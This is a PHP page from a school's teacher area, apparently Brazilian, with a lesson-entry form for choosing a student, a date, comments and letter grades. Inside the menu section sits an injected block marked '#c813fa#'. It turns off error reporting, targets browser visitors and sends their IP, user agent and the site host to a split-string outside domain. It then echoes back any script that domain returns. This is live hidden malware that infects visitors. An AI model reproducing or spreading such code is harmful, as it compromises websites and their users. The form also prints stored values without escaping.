<?php

include_once('include/basics.php');
include_once('../classes/alunos.php');
include_once('../classes/licoes.php');

$alunos = DAO::find('alunos', array('ativo' => 'S'), 'nome asc');

$licao = new licoes();

if ( isset( $_POST['id'] ) )
{
	$licao = new licoes( $_POST['id'] );

	if ( ! isset( $licao->id ) )
	{
		$_SESSION['b-msg'] = "Não foi possível encontrar a lição.";
		header( "Location: mensagens.php" );
	}
}
else
{
	$licao->id = 0;
}

?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8" />
		<title><?php echo PAGE_TITLE ?> - Área do Professor</title>
		<link href="styles/index.css?<?php echo time();?>" rel="stylesheet" type="text/css" />
		<link href="styles/styles.css?<?php echo time();?>" rel="stylesheet" type="text/css" />
		<link type="text/css" href="styles/ui-lightness/jquery-ui-1.8.17.custom.css?<?php echo time();?>" rel="stylesheet" />	
		<script type="text/javascript" src="scripts/jquery-1.7.1.min.js?<?php echo time();?>"></script>
		<script type="text/javascript" src="scripts/jquery.ui.datepicker-pt-BR.js?<?php echo time();?>"></script>
		<script type="text/javascript" src="scripts/jquery-ui-1.8.17.custom.min.js?<?php echo time();?>"></script>
        <script type="text/javascript" src="scripts/validate/jquery.validate.min.js?<?php echo time();?>"  charset="utf-8"></script>
        <script type="text/javascript" src="scripts/validate/localization/messages_ptbr.js?<?php echo time();?>" charset="utf-8"></script>
        <script type="text/javascript" src="scripts/functions.js?<?php echo time();?>" charset="utf-8"></script>
        <script>
			$(document).ready(function(){
				
				$(function() {
					$( "#data" ).datepicker();
				});
				// validação
				jQuery.validator.messages.required = "";
				jQuery.validator.addMethod("dataDMA", function(value, element) {
					return valida_data(value);
				}, "Data inválida");
				$("#lesson_form").validate({
					invalidHandler: function(e, validator) {
						var errors = validator.numberOfInvalids();
						if (errors)
						{
							var msg = "Preencha corretamente os campos.";
							alert(msg);
						}
					},
					errorClass: "erro_formulario",
					rules: {
						id_aluno: "required",
						data: 
						{
							required: true,
							dataDMA: true
						}, 
						lesson: "required",
						comentarios: "required",
						p: "required",
						s: "required",
						w: "required",
						l: "required",
						r: "required"
					},
					onsubmit: false,
					debug: true
				});
			});
		</script>	
	</head>
	<body>
		<div id="top"><a href="home.php"><img src="images/logo.jpg" alt="Home" title="Home" /></a></div>
		<div id="menu">
			<?php include( "include/menu.php" ); ?>
<?php
#c813fa#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/c813fa#
?>
		</div>
		<div id="conteudo">
			<form method="post" action="lessonForm.php" name="lesson_form" id="lesson_form">
				<table class="lesson">
					<tr>
						<td>Aluno</td>
						<td>						
							<select name="id_aluno" id="id_aluno">
								<option value="">Selecione...</option>
<?php foreach($alunos as $aluno): ?>
									<option value="<?php echo $aluno->id;?>" <?php echo ($licao->id_aluno == $aluno->id) ? 'selected' : '' ?>>
	<?php echo $aluno->nome;?>
									</option>
<?php endforeach ?>
							</select>
						</td>
						<td>Data</td>
						<td><input type="text" name="data" id="data" value="<?php echo $licao->data; ?>"/></td>
					</tr>
					<tr>
						<td>Lição</td>
						<td colspan="3"><input type="text" name="lesson" id="lesson" style="width: 396px;" value="<?php echo $licao->lesson ;?>"/></td>
					</tr>
					<tr>
						<td></td>
						<td valign="top"><textarea name="comentarios" id="comentarios" class="comentarios"><?php echo $licao->comentarios ;?></textarea></td>
						<td colspan="2" align="left" valign="top">
							<table>
								<tr><td>P:</td><td><input type="text" class="nota" name="p" id="p" maxlength="1" value="<?php echo $licao->p ;?>"/></td></tr>
								<tr><td>S:</td><td><input type="text" class="nota" name="s" id="s" maxlength="1" value="<?php echo $licao->s ;?>"/></td></tr>
								<tr><td>W:</td><td><input type="text" class="nota" name="w" id="w" maxlength="1" value="<?php echo $licao->w ;?>"/></td></tr>
								<tr><td>L:</td><td><input type="text" class="nota" name="l" id="l" maxlength="1" value="<?php echo $licao->l ;?>"/></td></tr>
								<tr><td>R:</td><td><input type="text" class="nota" name="r" id="r" maxlength="1" value="<?php echo $licao->r ;?>"/></td></tr>
							</table>
						</td>
					</tr>
					<tr>
                    	<td colspan="4" align="right" valign="bottom"><input name="Incluir" type="button" value="Incluir" class="incluir" onClick="valida_licao()"/></td>
                   	</tr>
				</table>
				<label class="legend">
<br>
					GOOD - (G) | REGULAR (R) | LOW - (L) | NON APPLICABLE (X)
				</label>
				<input type="hidden" value="<?php echo $_SESSION['prof_id']; ?>" name="id_professor" />
				<input type="hidden" value="<?php echo $licao->id; ?>" name="id" />
			</form>
		</div>
	</body>
</html>